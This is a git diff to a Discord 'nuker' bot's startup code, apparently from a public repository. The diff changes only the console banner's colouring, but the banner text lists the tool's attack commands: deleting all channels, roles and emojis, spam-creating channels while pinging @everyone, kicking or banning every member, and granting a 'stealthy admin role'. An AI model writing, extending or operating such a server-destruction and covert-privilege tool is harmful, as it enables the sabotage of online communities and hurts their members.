@@ -1,11 +1,11 @@
 const { token, prefix, randomChannelNames, randomPingMessages, randomRoleNames, ownerId, publicUse } = require('./config.json');
 const discord = require('discord.js');
-const discBuilders = require('@discordjs/builders');
+const gradient = require('gradient-string');
 const { red, green, blue, cyan } = require('chalk');
 const bot = new discord.Client({ intents: [discord.Intents.FLAGS.GUILD_PRESENCES, discord.Intents.FLAGS.GUILDS, discord.Intents.FLAGS.GUILD_MEMBERS, discord.Intents.FLAGS.GUILD_MESSAGES, discord.Intents.FLAGS.GUILD_EMOJIS_AND_STICKERS, discord.Intents.FLAGS.GUILD_BANS]});
 
 bot.once('ready', () => {
-    console.log(cyan(`
+    console.log(gradient.passion(`
 
 	██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
 	██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
@@ -15,20 +15,24 @@ bot.once('ready', () => {
 	╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝     ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝																							   
 					made by @unchilled on GH
 `));
-	console.log(green(`
-Logged in as: ${bot.user.tag}
-Owner ID: ${ownerId}
-Prefix: ${prefix}
-`));	
-	console.log(cyan(`Commands: 
-${prefix}nuke - delete all channels, roles, and emojis.
-${prefix}spamnuke - delete all channels, roles, and emojis, spam create roles+channels and spam ping @everyone.
-${prefix}kickall - kick all members from the server.
-${prefix}banall - ban all members from the server.
-${prefix}delchannels - delete all channels.
-${prefix}delroles - delete all roles.
-${prefix}admin - gives user stealthy admin role.
-`)) 
+	console.log(gradient.summer.multiline([
+		`Logged in as: ${bot.user.tag}`,
+		`Owner ID: ${ownerId}`,
+		`Public Use: ${publicUse}`,
+		`Prefix: ${prefix}`
+	].join('\n')));	
+	console.log(gradient.instagram.multiline([
+		``,
+		`Commands:`,
+		`${prefix}nuke - delete all channels, roles, and emojis.`,
+		`${prefix}spamnuke - delete all channels, roles, and emojis, spam create roles+channels and spam ping @everyone.`,
+		`${prefix}kickall - kick all members from the server.`,
+		`${prefix}banall - ban all members from the server.`,
+		`${prefix}delchannels - delete all channels.`,
+		`${prefix}delroles - delete all roles.`,
+		`${prefix}admin - gives user stealthy admin role.`,
+		``
+	].join('\n'))) 
 })
 
 bot.on('messageCreate', msg => {
